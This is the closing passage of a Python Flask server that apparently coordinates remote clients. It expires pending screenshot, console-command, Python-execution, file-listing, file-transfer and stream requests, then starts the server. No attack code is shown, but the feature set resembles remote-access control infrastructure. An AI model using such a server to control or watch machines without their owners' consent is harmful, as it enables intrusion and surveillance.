    shutil.rmtree(transfer_dir, ignore_errors=True)

    add_log(
        "info" if success else "warn",
        "Downloader: " + name +
        (" saved the files." if success else " failed to save the files.")
    )

    return jsonify({"success": True})


# ==================================================
# CLEANUP
# ==================================================

def cleanup():

    while True:

        time.sleep(300)

        now = time.time()

        with lock:

            for name in list(clients):

                if now - clients[name]["last_seen"] > OFFLINE_AFTER_SECONDS:
                    remove_client(name)

            for download_id in list(downloads):

                if now - downloads[download_id]["created"] > 1800:
                    downloads.pop(download_id, None)

            for request_id in list(screenshots):

                if now - screenshots[request_id]["created"] > 1800:
                    screenshots.pop(request_id, None)

            for command_id in list(console_commands):

                if now - console_commands[command_id]["created"] > 1800:
                    console_commands.pop(command_id, None)

            for request_id in list(python_requests):

                if now - python_requests[request_id]["created"] > 1800:
                    python_requests.pop(request_id, None)

            for request_id in list(listing_requests):

                if now - listing_requests[request_id]["created"] > 600:
                    listing_requests.pop(request_id, None)

            for transfer_id in list(pushes):

                item = pushes[transfer_id]

                if now - item["created"] > 1800:
                    pushes.pop(transfer_id, None)
                    shutil.rmtree(
                        item["dir"],
                        ignore_errors=True
                    )

            for name in list(streams):

                state = streams[name]

                if (
                    not state["active"]
                    and now - state["timestamp"] > 300
                ):
                    streams.pop(name, None)


threading.Thread(
    target=cleanup,
    daemon=True
).start()


# ==================================================
# START SERVER
# ==================================================

if __name__ == "__main__":

    app.run(
        host="0.0.0.0",
        port=int(os.environ.get("PORT", 5000)),
        debug=False
    )
